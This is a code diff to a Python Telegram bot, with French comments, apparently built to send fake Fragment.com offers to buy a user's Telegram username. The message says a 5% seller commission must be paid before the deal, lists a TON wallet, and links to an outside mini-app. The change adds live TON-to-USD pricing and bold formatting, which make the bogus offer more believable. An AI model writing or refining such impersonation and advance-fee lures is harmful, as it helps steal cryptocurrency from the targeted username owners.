@@ -13,6 +13,7 @@ from telegram.ext import (
 )
 from telegram.error import Conflict, NetworkError
 import asyncio
+import aiohttp
 from http.server import HTTPServer, BaseHTTPRequestHandler
 from threading import Thread
 import time
@@ -38,6 +39,22 @@ print(f"🔍 DEBUG: PORT: {PORT}")
 
 # Variables globales pour stocker les données
 user_data = {}
+
+# ===== FONCTION PRIX TON =====
+async def get_ton_price():
+    """Récupère le prix du TON en USD via l'API DIA"""
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.get("https://api.diadata.org/v1/assetQuotation/Ton/0x0000000000000000000000000000000000000000", timeout=5) as response:
+                if response.status == 200:
+                    data = await response.json()
+                    return float(data.get('Price', 5.50))  # Prix en USD
+                else:
+                    logger.warning(f"Erreur API DIA: {response.status}")
+                    return 5.50  # Fallback
+    except Exception as e:
+        logger.warning(f"Erreur récupération prix TON: {e}")
+        return 5.50  # Fallback en cas d'erreur
 
 # ===== SERVEUR DE SANTÉ =====
 class HealthHandler(BaseHTTPRequestHandler):
@@ -190,14 +207,17 @@ async def get_price(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
             )
             return ConversationHandler.END
         
-        # Calcul de la commission (5%)
+        # Calculs avec prix TON en temps réel
         commission = price * 0.05
+        ton_to_usd = await get_ton_price()  # Prix en temps réel
+        price_usd = price * ton_to_usd
+        commission_usd = commission * ton_to_usd
         
-        # Message de simulation Fragment (DIRECTEMENT SANS CONFIRMATION)
+        # Message de simulation Fragment avec wallet cliquable intégré
         deal_message = f"""We have received a purchase request for your username @{username.upper()}_DEAL via Fragment.com. Below are the transaction details:
 
-• Offer Amount: 💎{price:g}
-• Commission: 💎{commission:g}
+**• Offer Amount: 💎{price:g} (${price_usd:.2f} USD)
+• Commission: 💎{commission:g} (${commission_usd:.2f} USD)**
 
 Please note that a 5% commission is charged to the seller prior to accepting the deal. This ensures a secure and efficient transaction process.
 
@@ -207,8 +227,8 @@ Additional Information:
 • Wallet: [EQBBlxK8VBxEidbxw4oQVyLSk7iEf9VPJxetaRQpEbi-XG4U](https://tonviewer.com/EQBBlxK8VBxEidbxw4oQVyLSk7iEf9VPJxetaRQpEbi-XG4U)
 
 Important:
-• Please proceed only if you are willing to transform your username into a collectible. This action is irreversible.
-• If you choose not to proceed, simply ignore this message."""
+**• Please proceed only if you are willing to transform your username into a collectible. This action is irreversible.
+• If you choose not to proceed, simply ignore this message.**"""
         
         # Bouton vers la mini-app
         keyboard = [[InlineKeyboardButton("View details", url=f"https://myminiapp.onrender.com/?user={username}_deal&price={price:g}")]]
@@ -216,7 +236,8 @@ Important:
         
         await update.message.reply_text(
             deal_message,
-            reply_markup=reply_markup
+            reply_markup=reply_markup,
+            parse_mode='Markdown'
         )
         
         # Nettoyage des données temporaires
@@ -305,7 +326,7 @@ def main():
         application.add_handler(conv_handler)
         
         print("🚀 Fragment Deal Bot démarré...")
-        print("💎 Mode: TON uniquement")
+        print("💎 Mode: TON avec prix temps réel")
         print("🏥 Serveur de santé: Activé")
         print("🔄 Mode: Polling (Compatible Render)")
         
